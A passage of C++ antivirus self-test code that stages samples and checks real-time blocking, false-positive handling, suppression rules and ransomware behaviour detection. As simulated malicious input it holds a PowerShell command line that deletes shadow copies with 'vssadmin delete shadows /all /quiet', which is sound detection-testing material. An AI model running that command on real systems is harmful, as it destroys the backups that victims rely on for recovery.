                     L"Realtime execute inspection returned action block with disposition " +
                         VerdictDispositionToString(outcome.finding.verdict.disposition) + L" at confidence " +
                         std::to_wstring(outcome.finding.verdict.confidence) + L" (reason " +
                         FirstReasonCode(outcome.finding) + L").");
          } else {
            AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
                     L"Realtime execute inspection returned action " +
                         std::wstring(outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ? L"block" : L"allow") +
                         L" with disposition " + VerdictDispositionToString(outcome.finding.verdict.disposition) + L".",
                     L"Review realtime broker policy/scoring so execution-time malicious artifacts are blocked.");
          }
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase1_execution_blocking", L"Phase 1 execution-time blocking", SelfTestStatus::Fail,
                 L"Realtime execute validation failed: " + Utf8ToWide(error.what()),
                 L"Validate local runtime database/evidence paths and rerun self-test in the endpoint service context.");
      }
    }

    const auto cleanwareSamplePath = phaseValidationRoot / L"phase1-cleanware-business-note.txt";
    if (!WriteSelfTestSample(cleanwareSamplePath, kCleanwareDiskSample)) {
      AddCheck(report, L"phase1_false_positive_cleanware_scan", L"Phase 1 cleanware scan allowance",
               SelfTestStatus::Fail,
               L"Self-test could not write the staged cleanware scan sample at " + cleanwareSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      auto cleanwarePolicy = CreateDefaultPolicySnapshot();
      cleanwarePolicy.cloudLookupEnabled = false;
      cleanwarePolicy.quarantineOnMalicious = false;

      const auto cleanwareFinding = ScanFile(cleanwareSamplePath, cleanwarePolicy);
      if (!cleanwareFinding.has_value()) {
        AddCheck(report, L"phase1_false_positive_cleanware_scan", L"Phase 1 cleanware scan allowance",
                 SelfTestStatus::Pass,
                 L"ScanFile produced no finding for staged cleanware content in " + cleanwareSamplePath.wstring() + L".");
      } else {
        AddCheck(report, L"phase1_false_positive_cleanware_scan", L"Phase 1 cleanware scan allowance",
                 SelfTestStatus::Fail,
                 L"ScanFile returned disposition " + VerdictDispositionToString(cleanwareFinding->verdict.disposition) +
                     L" for staged cleanware content (reason " + FirstReasonCode(*cleanwareFinding) + L").",
                 L"Tune heuristic signatures/scores so clean business content is not surfaced as a malware finding.");
      }
    }

    const auto cleanwareExecutionPath = phaseValidationRoot / L"phase1-cleanware-execution.ps1";
    if (!WriteSelfTestSample(cleanwareExecutionPath, kCleanwareExecutionSample)) {
      AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
               SelfTestStatus::Fail,
               L"Self-test could not write the staged cleanware execution sample at " +
                   cleanwareExecutionPath.wstring() + L".",
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      try {
        auto realtimeConfig = config;
        realtimeConfig.runtimeDatabasePath = phaseValidationRoot / L"phase1-cleanware-runtime.db";
        realtimeConfig.quarantineRootPath = phaseValidationRoot / L"phase1-cleanware-quarantine";
        realtimeConfig.evidenceRootPath = phaseValidationRoot / L"phase1-cleanware-evidence";
        realtimeConfig.scanExcludedPaths.clear();

        std::error_code runtimePathError;
        std::filesystem::create_directories(realtimeConfig.runtimeDatabasePath.parent_path(), runtimePathError);
        std::filesystem::create_directories(realtimeConfig.quarantineRootPath, runtimePathError);
        std::filesystem::create_directories(realtimeConfig.evidenceRootPath, runtimePathError);
        if (runtimePathError) {
          AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                   SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated realtime cleanware paths under " +
                       phaseValidationRoot.wstring() + L".",
                   L"Ensure runtime, quarantine, and evidence roots are writable before validating cleanware execution allowance.");
        } else {
          auto realtimePolicy = CreateDefaultPolicySnapshot();
          realtimePolicy.cloudLookupEnabled = false;
          realtimePolicy.quarantineOnMalicious = false;

          RealtimeProtectionBroker broker(realtimeConfig);
          broker.SetPolicy(realtimePolicy);
          broker.SetDeviceId(L"self-test-device");

          RealtimeFileScanRequest request{};
          request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
          request.requestSize = sizeof(request);
          request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                               std::chrono::system_clock::now().time_since_epoch())
                                                               .count());
          request.operation = ANTIVIRUS_REALTIME_FILE_OPERATION_EXECUTE;
          request.processId = GetCurrentProcessId();
          request.threadId = GetCurrentThreadId();

          std::error_code absolutePathError;
          auto resolvedExecutionSamplePath = std::filesystem::absolute(cleanwareExecutionPath, absolutePathError);
          if (absolutePathError) {
            resolvedExecutionSamplePath = cleanwareExecutionPath;
          }

          std::error_code sampleSizeError;
          request.fileSizeBytes = std::filesystem::file_size(resolvedExecutionSamplePath, sampleSizeError);
          if (sampleSizeError) {
            request.fileSizeBytes = 0;
          }

          const auto processImage = PathExists(servicePath) ? servicePath.wstring() : L"fenrir-agent-service.exe";
          CopyWideField(request.correlationId, L"self-test-phase1-cleanware-execution");
          CopyWideField(request.path, resolvedExecutionSamplePath.wstring());
          CopyWideField(request.processImage, processImage);
          CopyWideField(request.parentImage, processImage);
          CopyWideField(request.commandLine, L"fenrir-agent-service.exe --self-test");
          CopyWideField(request.userSid, L"S-1-5-18");

          const auto outcome = broker.InspectFile(request);
          if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_ALLOW &&
              outcome.finding.verdict.disposition == VerdictDisposition::Allow && !outcome.detection) {
            AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                     SelfTestStatus::Pass,
                     L"Realtime execute inspection allowed staged cleanware content with disposition allow.");
          } else {
            AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                     SelfTestStatus::Fail,
                     L"Realtime execute inspection returned action " +
                         std::wstring(outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ? L"block" : L"allow") +
                         L" with disposition " + VerdictDispositionToString(outcome.finding.verdict.disposition) +
                         L" for staged cleanware content (reason " + FirstReasonCode(outcome.finding) + L").",
                     L"Tune realtime correlation and scan thresholds so benign script execution is not blocked.");
          }
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase1_false_positive_cleanware_execution", L"Phase 1 cleanware execution allowance",
                 SelfTestStatus::Fail,
                 L"Realtime cleanware validation failed: " + Utf8ToWide(error.what()),
                 L"Validate local runtime database/evidence paths and rerun self-test in the endpoint service context.");
      }
    }

    const auto brokerLoadMaliciousPath = phaseValidationRoot / L"phase1-broker-load-malicious.ps1";
    const auto brokerLoadBenignPath = phaseValidationRoot / L"phase1-broker-load-benign.txt";
    if (!WriteSelfTestSample(brokerLoadMaliciousPath, kExecutionBlockingSample) ||
        !WriteSelfTestSample(brokerLoadBenignPath, kCleanwareDiskSample)) {
      AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
               L"Self-test could not stage broker load-validation artifacts under " + phaseValidationRoot.wstring() + L".",
               L"Ensure runtime/temp roots are writable before running broker load/fail-mode validation.");
    } else {
      try {
        auto realtimeConfig = config;
        realtimeConfig.runtimeDatabasePath = phaseValidationRoot / L"phase1-broker-load-runtime.db";
        realtimeConfig.quarantineRootPath = phaseValidationRoot / L"phase1-broker-load-quarantine";
        realtimeConfig.evidenceRootPath = phaseValidationRoot / L"phase1-broker-load-evidence";
        realtimeConfig.scanExcludedPaths.clear();

        std::error_code runtimePathError;
        std::filesystem::create_directories(realtimeConfig.runtimeDatabasePath.parent_path(), runtimePathError);
        std::filesystem::create_directories(realtimeConfig.quarantineRootPath, runtimePathError);
        std::filesystem::create_directories(realtimeConfig.evidenceRootPath, runtimePathError);
        if (runtimePathError) {
          AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
                   L"Self-test could not prepare isolated broker load-validation paths under " +
                       phaseValidationRoot.wstring() + L".",
                   L"Ensure runtime, quarantine, and evidence roots are writable before running broker load/fail-mode checks.");
        } else {
          auto realtimePolicy = CreateDefaultPolicySnapshot();
          realtimePolicy.cloudLookupEnabled = false;
          realtimePolicy.quarantineOnMalicious = false;

          RealtimeProtectionBroker broker(realtimeConfig);
          broker.SetPolicy(realtimePolicy);
          broker.SetDeviceId(L"self-test-device");

          struct BurstMetrics {
            int blockCount{0};
            int allowCount{0};
            long long p95LatencyMs{0};
            long long maxLatencyMs{0};
          };

          const auto processImage = PathExists(servicePath) ? servicePath.wstring() : L"fenrir-agent-service.exe";
          const auto runBurst = [&broker, &processImage](const std::filesystem::path& path,
                                                         const RealtimeFileOperation operation,
                                                         const int iterations,
                                                         const std::wstring& correlationIdPrefix) {
            BurstMetrics metrics{};
            std::vector<long long> latencySamples;
            latencySamples.reserve(static_cast<std::size_t>(std::max(iterations, 0)));

            std::error_code absolutePathError;
            auto resolvedPath = std::filesystem::absolute(path, absolutePathError);
            if (absolutePathError) {
              resolvedPath = path;
            }

            for (int index = 0; index < iterations; ++index) {
              RealtimeFileScanRequest request{};
              request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
              request.requestSize = sizeof(request);
              request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                                   std::chrono::system_clock::now().time_since_epoch())
                                                                   .count() + index);
              request.operation = operation;
              request.processId = GetCurrentProcessId();
              request.threadId = GetCurrentThreadId();

              std::error_code fileSizeError;
              request.fileSizeBytes = std::filesystem::file_size(resolvedPath, fileSizeError);
              if (fileSizeError) {
                request.fileSizeBytes = 0;
              }

              CopyWideField(request.correlationId, correlationIdPrefix + L"-" + std::to_wstring(index));
              CopyWideField(request.path, resolvedPath.wstring());
              CopyWideField(request.processImage, processImage);
              CopyWideField(request.parentImage, processImage);
              CopyWideField(request.commandLine, L"fenrir-agent-service.exe --self-test --broker-load");
              CopyWideField(request.userSid, L"S-1-5-18");

              const auto startedAt = std::chrono::steady_clock::now();
              const auto outcome = broker.InspectFile(request);
              const auto completedAt = std::chrono::steady_clock::now();
              const auto latencyMs =
                  std::chrono::duration_cast<std::chrono::milliseconds>(completedAt - startedAt).count();
              latencySamples.push_back(latencyMs);

              const auto blocked = outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ||
                                   outcome.finding.verdict.disposition == VerdictDisposition::Block ||
                                   outcome.finding.verdict.disposition == VerdictDisposition::Quarantine;
              if (blocked) {
                ++metrics.blockCount;
              } else {
                ++metrics.allowCount;
              }
            }

            if (!latencySamples.empty()) {
              std::sort(latencySamples.begin(), latencySamples.end());
              const auto percentileIndex = (latencySamples.size() * 95) / 100;
              metrics.p95LatencyMs = latencySamples[std::min(percentileIndex, latencySamples.size() - 1)];
              metrics.maxLatencyMs = latencySamples.back();
            }

            return metrics;
          };

          const auto benignMetrics =
              runBurst(brokerLoadBenignPath, ANTIVIRUS_REALTIME_FILE_OPERATION_WRITE, 120, L"self-test-phase1-broker-benign");
          const auto renameMaliciousMetrics = runBurst(brokerLoadMaliciousPath, ANTIVIRUS_REALTIME_FILE_OPERATION_RENAME,
                                                       24, L"self-test-phase1-broker-rename");
          const auto sectionMaliciousMetrics = runBurst(
              brokerLoadMaliciousPath, ANTIVIRUS_REALTIME_FILE_OPERATION_SECTION_MAP, 24,
              L"self-test-phase1-broker-section");

          const auto benignAllowRatio = benignMetrics.allowCount / 120.0;
          const auto renameBlockRatio = renameMaliciousMetrics.blockCount / 24.0;
          const auto sectionBlockRatio = sectionMaliciousMetrics.blockCount / 24.0;

          if (benignAllowRatio >= 0.95 && renameBlockRatio >= 0.95 && sectionBlockRatio >= 0.95 &&
              benignMetrics.p95LatencyMs <= 250) {
            AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Pass,
                     L"Under burst load, benign write requests remained allow-biased while malicious rename/section requests "
                     L"stayed fail-closed (benign allow ratio " + std::to_wstring(benignAllowRatio) +
                         L", rename block ratio " + std::to_wstring(renameBlockRatio) +
                         L", section block ratio " + std::to_wstring(sectionBlockRatio) +
                         L", benign p95 latency " + std::to_wstring(benignMetrics.p95LatencyMs) + L" ms)." );
          } else {
            AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
                     L"Broker load/fail-mode validation did not meet thresholds (benign allow ratio " +
                         std::to_wstring(benignAllowRatio) + L", rename block ratio " +
                         std::to_wstring(renameBlockRatio) + L", section block ratio " +
                         std::to_wstring(sectionBlockRatio) + L", benign p95 latency " +
                         std::to_wstring(benignMetrics.p95LatencyMs) + L" ms, benign max latency " +
                         std::to_wstring(benignMetrics.maxLatencyMs) + L" ms).",
                     L"Review realtime broker latency budgets and fail-closed operation mapping for rename/section interception paths.");
          }
        }
      } catch (const std::exception& error) {
        AddCheck(report, L"phase1_broker_load_failmode", L"Phase 1 broker load/fail-mode proof", SelfTestStatus::Fail,
                 L"Broker load/fail-mode simulation failed: " + Utf8ToWide(error.what()),
                 L"Validate isolated runtime/evidence paths and rerun self-test in endpoint service context.");
      }
    }

    const auto browserDownloadInstallRoot = phaseValidationRoot / L"phase1-browser-download-install-set";
    const std::vector<std::filesystem::path> browserDownloadInstallSamples = {
        browserDownloadInstallRoot / L"downloads" / L"invoice.pdf",
        browserDownloadInstallRoot / L"downloads" / L"QuarterlySummary.xlsx",
        browserDownloadInstallRoot / L"installers" / L"AcmeUpdater.log",
        browserDownloadInstallRoot / L"installers" / L"release-notes.txt",
    };

    std::vector<std::wstring> writeFailures;
    for (const auto& samplePath : browserDownloadInstallSamples) {
      if (!WriteSelfTestSample(samplePath, kBrowserDownloadInstallSample)) {
        writeFailures.push_back(samplePath.wstring());
      }
    }

    if (!writeFailures.empty()) {
      std::wstring details = L"Self-test could not stage one or more benign browser/download/install samples:";
      for (const auto& failedPath : writeFailures) {
        details += L" ";
        details += failedPath;
      }

      AddCheck(report, L"phase1_browser_download_install_set", L"Phase 1 browser/download/install clean set",
               SelfTestStatus::Fail, details,
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      auto cleanSetPolicy = CreateDefaultPolicySnapshot();
      cleanSetPolicy.cloudLookupEnabled = false;
      cleanSetPolicy.quarantineOnMalicious = false;

      const auto cleanSetFindings = ScanTargets({browserDownloadInstallRoot}, cleanSetPolicy);
      if (cleanSetFindings.empty()) {
        AddCheck(report, L"phase1_browser_download_install_set", L"Phase 1 browser/download/install clean set",
                 SelfTestStatus::Pass,
                 L"ScanTargets returned no malicious findings across staged benign browser/download/install artifacts.");
      } else {
        const auto& firstFinding = cleanSetFindings.front();
        AddCheck(report, L"phase1_browser_download_install_set", L"Phase 1 browser/download/install clean set",
                 SelfTestStatus::Fail,
                 L"ScanTargets flagged staged benign artifact " + firstFinding.path.wstring() + L" with disposition " +
                     VerdictDispositionToString(firstFinding.verdict.disposition) + L" (reason " +
                     FirstReasonCode(firstFinding) + L").",
                 L"Tune false-positive heuristics for common business download/install artifacts before pilot rollout.");
      }
    }

    const auto suppressionRoot = phaseValidationRoot / L"phase1-suppression-root";
    const auto suppressionSamplePath = suppressionRoot / L"phase1-suppressed-eicar.txt";
    if (!WriteSelfTestSample(suppressionSamplePath, kDiskBlockingSample)) {
      AddCheck(report, L"phase1_suppression_workflow", L"Phase 1 suppression workflow", SelfTestStatus::Fail,
               L"Self-test could not write the staged suppression sample at " + suppressionSamplePath.wstring() + L".",
               L"Verify local runtime/temp ACLs and rerun self-test from the target endpoint context.");
    } else {
      auto suppressionPolicy = CreateDefaultPolicySnapshot();
      suppressionPolicy.cloudLookupEnabled = false;
      suppressionPolicy.quarantineOnMalicious = false;
      suppressionPolicy.suppressionPathRoots.push_back(suppressionRoot.wstring());

      const auto allowOverride = BuildAllowOverrideFinding(suppressionSamplePath, suppressionPolicy);
      const auto scanFinding = ScanFile(suppressionSamplePath, suppressionPolicy);
      const auto overrideMatched = allowOverride.has_value() &&
                                   allowOverride->verdict.disposition == VerdictDisposition::Allow &&
                                   FindingHasReasonCode(*allowOverride, L"POLICY_SUPPRESSION_PATH_ROOT");
      if (overrideMatched && !scanFinding.has_value()) {
        AddCheck(report, L"phase1_suppression_workflow", L"Phase 1 suppression workflow", SelfTestStatus::Pass,
                 L"Suppression path-root policy produced an allow override and bypassed malicious-file scoring for staged sample.");
      } else {
        std::wstring details = L"Suppression path-root validation did not complete expected allow/bypass behavior.";
        if (allowOverride.has_value()) {
          details += L" Override disposition: ";
          details += VerdictDispositionToString(allowOverride->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*allowOverride);
          details += L").";
        } else {
          details += L" No allow-override finding was produced.";
        }

        if (scanFinding.has_value()) {
          details += L" ScanFile still returned disposition ";
          details += VerdictDispositionToString(scanFinding->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*scanFinding);
          details += L").";
        }

        AddCheck(report, L"phase1_suppression_workflow", L"Phase 1 suppression workflow", SelfTestStatus::Fail,
                 details,
                 L"Review suppression policy matching and allow-override handling so approved cleanware exceptions remain enforceable.");
      }
    }

    const auto signedCandidate = FindSignedSystemBinaryCandidate();
    if (!signedCandidate.has_value()) {
      AddCheck(report, L"phase1_signed_software_trust", L"Phase 1 signed software trust tests",
               SelfTestStatus::Warning,
               L"Self-test did not find an Authenticode-signed Windows binary with a readable signer subject.",
               L"Run this check on a standard Windows client image with default signed system binaries available.");
    } else {
      auto trustPolicy = CreateDefaultPolicySnapshot();
      trustPolicy.cloudLookupEnabled = false;
      trustPolicy.quarantineOnMalicious = false;

      const auto baselineFinding = ScanFile(signedCandidate->path, trustPolicy);
      const auto baselineSafe = !baselineFinding.has_value() ||
                                baselineFinding->verdict.disposition == VerdictDisposition::Allow;

      auto signerSuppressionPolicy = trustPolicy;
      signerSuppressionPolicy.suppressionSignerNames.push_back(signedCandidate->signer);

      const auto signerOverride = BuildAllowOverrideFinding(signedCandidate->path, signerSuppressionPolicy);
      const auto signerSuppressedScan = ScanFile(signedCandidate->path, signerSuppressionPolicy);
      const auto signerSuppressionMatched =
          signerOverride.has_value() &&
          signerOverride->verdict.disposition == VerdictDisposition::Allow &&
          FindingHasReasonCode(*signerOverride, L"POLICY_SUPPRESSION_SIGNER");

      if (baselineSafe && signerSuppressionMatched && !signerSuppressedScan.has_value()) {
        AddCheck(report, L"phase1_signed_software_trust", L"Phase 1 signed software trust tests",
                 SelfTestStatus::Pass,
                 L"Verified signed software trust behavior with " + signedCandidate->path.wstring() +
                     L" (signer: " + signedCandidate->signer + L").");
      } else {
        std::wstring details =
            L"Signed software trust validation failed for " + signedCandidate->path.wstring() + L".";
        if (baselineFinding.has_value()) {
          details += L" Baseline disposition: ";
          details += VerdictDispositionToString(baselineFinding->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*baselineFinding);
          details += L").";
        }

        if (signerOverride.has_value()) {
          details += L" Signer override disposition: ";
          details += VerdictDispositionToString(signerOverride->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*signerOverride);
          details += L").";
        } else {
          details += L" No signer suppression override was produced.";
        }

        if (signerSuppressedScan.has_value()) {
          details += L" ScanFile with signer suppression still returned ";
          details += VerdictDispositionToString(signerSuppressedScan->verdict.disposition);
          details += L" (reason ";
          details += FirstReasonCode(*signerSuppressedScan);
          details += L").";
        }

        AddCheck(report, L"phase1_signed_software_trust", L"Phase 1 signed software trust tests",
                 SelfTestStatus::Fail, details,
                 L"Tune signer reputation/suppression handling so trusted signed software does not regress into false positives.");
      }
    }

    try {
      auto phase2Config = config;
      phase2Config.runtimeDatabasePath = phaseValidationRoot / L"phase2-runtime.db";
      phase2Config.quarantineRootPath = phaseValidationRoot / L"phase2-quarantine";
      phase2Config.evidenceRootPath = phaseValidationRoot / L"phase2-evidence";
      phase2Config.scanExcludedPaths.clear();

      std::error_code phase2PathError;
      std::filesystem::create_directories(phase2Config.runtimeDatabasePath.parent_path(), phase2PathError);
      std::filesystem::create_directories(phase2Config.quarantineRootPath, phase2PathError);
      std::filesystem::create_directories(phase2Config.evidenceRootPath, phase2PathError);

      if (phase2PathError) {
        AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_ransomware_extension_burst", L"Phase 2 ransomware extension-burst detection",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_ransomware_staged_impact_chain", L"Phase 2 ransomware staged-impact chain",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_ransomware_false_positive_bulk_io",
                 L"Phase 2 benign bulk-I/O false-positive resistance", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_ransomware_false_positive_photo_export",
                 L"Phase 2 benign photo/video export false-positive resistance", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_ransomware_false_positive_developer_build",
                 L"Phase 2 developer build false-positive resistance", SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_rule_quality_budget", L"Phase 2 rule-quality and false-positive budget",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_cleanware_corpus_awareness", L"Phase 2 cleanware corpus awareness",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
        AddCheck(report, L"phase2_false_positive_corpus_awareness", L"Phase 2 false-positive corpus awareness",
                 SelfTestStatus::Fail,
                 L"Self-test could not prepare isolated Phase 2 runtime paths under " + phaseValidationRoot.wstring() + L".",
                 L"Ensure runtime, quarantine, and evidence roots are writable before running Phase 2 behavior checks.");
      } else {
        auto phase2Policy = CreateDefaultPolicySnapshot();
        phase2Policy.cloudLookupEnabled = false;
        phase2Policy.quarantineOnMalicious = false;
        phase2Policy.realtimeExecuteBlockThreshold = 45;
        phase2Policy.realtimeNonExecuteBlockThreshold = 55;
        phase2Policy.realtimeQuarantineThreshold = 70;
        phase2Policy.realtimeObserveTelemetryThreshold = 30;
        phase2Policy.realtimeObserveOnlyForNonExecute = false;
        phase2Policy.archiveObserveOnly = false;

        RealtimeProtectionBroker broker(phase2Config);
        broker.SetPolicy(phase2Policy);
        broker.SetDeviceId(L"self-test-device");

        struct Phase2BurstScenarioResult {
          bool blocked{false};
          int blockedCount{0};
          std::vector<std::wstring> reasonCodes;
          std::wstring details;
        };

        const auto joinReasonCodes = [](const std::vector<std::wstring>& reasonCodes) {
          if (reasonCodes.empty()) {
            return std::wstring(L"none");
          }

          std::wstring joined;
          for (std::size_t index = 0; index < reasonCodes.size(); ++index) {
            if (index != 0) {
              joined += L", ";
            }
            joined += reasonCodes[index];
          }
          return joined;
        };

        const auto hasReasonCodePrefix = [](const Phase2BurstScenarioResult& result, const std::wstring& prefix) {
          return std::any_of(result.reasonCodes.begin(), result.reasonCodes.end(),
                             [&prefix](const auto& code) { return code.starts_with(prefix); });
        };

        const auto hasReasonCode = [](const Phase2BurstScenarioResult& result, const std::wstring& code) {
          return std::any_of(result.reasonCodes.begin(), result.reasonCodes.end(),
                             [&code](const auto& candidate) { return candidate == code; });
        };

        const auto observeBehaviorEvent = [&broker](const EventKind kind,
                                                    const std::wstring& correlationId,
                                                    const std::wstring& targetPath,
                                                    const std::wstring& processImage,
                                                    const std::wstring& parentImage,
                                                    const std::wstring& commandLine,
                                                    const std::wstring& userSid) {
          broker.ObserveBehaviorEvent(EventEnvelope{
              .kind = kind,
              .deviceId = L"self-test-device",
              .correlationId = correlationId,
              .targetPath = targetPath,
              .sha256 = {},
              .process =
                  ProcessContext{
                      .imagePath = processImage,
                      .commandLine = commandLine,
                      .parentImagePath = parentImage,
                      .userSid = userSid,
                      .signer = {}},
              .occurredAt = std::chrono::system_clock::now(),
          });
        };

        const auto runBurstScenario = [&broker, &joinReasonCodes](const std::filesystem::path& root,
                                                                  const std::wstring& correlationId,
                                                                  const std::wstring& processImage,
                                                                  const std::wstring& parentImage,
                                                                  const std::wstring& commandLine,
                                                                  const std::wstring& userSid,
                                                                  const char* payload,
                                                                  const std::vector<std::wstring>& extensions,
                                                                  const bool includeEncryptedExtensions,
                                                                  const std::size_t encryptedExtensionStartIndex = 24) {
          std::vector<std::filesystem::path> stagedPaths;
          const std::vector<std::wstring> directories = {L"documents", L"desktop", L"downloads", L"pictures", L"projects"};
          constexpr std::size_t kSampleCount = 40;

          for (std::size_t index = 0; index < kSampleCount; ++index) {
            const auto directoryName = directories[index % directories.size()];
            std::wstring extension = extensions[index % extensions.size()];
            if (includeEncryptedExtensions && index >= encryptedExtensionStartIndex) {
              extension = (index % 2 == 0) ? L".locked" : L".encrypted";
            }

            const auto stagedPath = root / directoryName / (L"phase2-file-" + std::to_wstring(index + 1) + extension);
            if (!WriteSelfTestSample(stagedPath, payload)) {
              return Phase2BurstScenarioResult{
                  .blocked = false,
                  .blockedCount = 0,
                  .reasonCodes = {},
                  .details = L"Failed to stage " + stagedPath.wstring() + L"."};
            }
            stagedPaths.push_back(stagedPath);
          }

          Phase2BurstScenarioResult result{};
          for (std::size_t index = 0; index < stagedPaths.size(); ++index) {
            const auto& stagedPath = stagedPaths[index];
            std::error_code absolutePathError;
            auto resolvedPath = std::filesystem::absolute(stagedPath, absolutePathError);
            if (absolutePathError) {
              resolvedPath = stagedPath;
            }

            RealtimeFileScanRequest request{};
            request.protocolVersion = ANTIVIRUS_REALTIME_PROTOCOL_VERSION;
            request.requestSize = sizeof(request);
            request.requestId = static_cast<std::uint64_t>(std::chrono::duration_cast<std::chrono::milliseconds>(
                                                                 std::chrono::system_clock::now().time_since_epoch())
                                                                 .count() + index);
            request.operation = ANTIVIRUS_REALTIME_FILE_OPERATION_WRITE;
            request.processId = GetCurrentProcessId();
            request.threadId = GetCurrentThreadId();

            std::error_code sizeError;
            request.fileSizeBytes = std::filesystem::file_size(resolvedPath, sizeError);
            if (sizeError) {
              request.fileSizeBytes = 0;
            }

            CopyWideField(request.correlationId, correlationId);
            CopyWideField(request.path, resolvedPath.wstring());
            CopyWideField(request.processImage, processImage);
            CopyWideField(request.parentImage, parentImage);
            CopyWideField(request.commandLine, commandLine);
            CopyWideField(request.userSid, userSid);

            const auto outcome = broker.InspectFile(request);
            if (outcome.action == ANTIVIRUS_REALTIME_RESPONSE_ACTION_BLOCK ||
                outcome.finding.verdict.disposition == VerdictDisposition::Block ||
                outcome.finding.verdict.disposition == VerdictDisposition::Quarantine) {
              ++result.blockedCount;
              result.blocked = true;
              for (const auto& reason : outcome.finding.verdict.reasons) {
                result.reasonCodes.push_back(reason.code);
              }
              result.details = L"Blocked " + resolvedPath.wstring() + L" with reasons [" +
                               joinReasonCodes(result.reasonCodes) + L"].";
              break;
            }
          }

          if (result.details.empty()) {
            result.details = L"No block was observed across staged write-churn simulation files.";
          }

          return result;
        };

        const auto maliciousScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-ransomware-burst",
            L"self-test-phase2-ransomware-burst",
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            L"C:\\Windows\\explorer.exe",
            L"powershell.exe -NoProfile -Command \"vssadmin delete shadows /all /quiet; $aes = New-Object System.Security.Cryptography.AesManaged\"",
            L"S-1-5-21-1000",
            kPhase2RansomwareBurstSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            true);

        if (maliciousScenario.blocked && hasReasonCodePrefix(maliciousScenario, L"REALTIME_RANSOMWARE_")) {
          AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                   SelfTestStatus::Pass,
                   L"Realtime write-churn simulation triggered ransomware behavior containment. " + maliciousScenario.details);
        } else {
          AddCheck(report, L"phase2_ransomware_behavior_chain", L"Phase 2 ransomware behavior chain",
                   SelfTestStatus::Fail,
                   L"Realtime write-churn simulation did not trigger expected ransomware behavior blocking. " +
                       maliciousScenario.details,
                   L"Tune Phase 2 behavior-chain scoring for destructive write bursts and pre-impact commands.");
        }

        const auto extensionBurstScenario = runBurstScenario(
            phaseValidationRoot / L"phase2-ransomware-extension-burst",
            L"self-test-phase2-extension-burst",
            L"C:\\Windows\\System32\\wscript.exe",
            L"C:\\Windows\\System32\\cmd.exe",
            L"wscript.exe //B //NoLogo rotate.js",
            L"S-1-5-21-1000",
            kPhase2RansomwareBurstSample,
            {L".docx", L".xlsx", L".pdf", L".jpg", L".txt", L".csv"},
            true,
            12);

